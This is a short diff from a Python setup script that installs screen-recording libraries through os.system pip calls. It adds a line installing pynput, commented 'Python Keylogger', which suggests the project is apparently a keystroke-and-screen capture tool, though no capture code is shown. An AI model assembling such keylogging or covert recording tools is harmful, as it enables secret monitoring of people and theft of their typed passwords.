@@ -10,3 +10,4 @@ os.system("pip install Wave")#screen recorder
 os.system("pip install pydub")#SCreen redorder
 os.system("pip install moviepy")#screen recorder
 os.system("pip install plyer")#screen recorder
+os.system("pip install pynput")#Python Keylogger
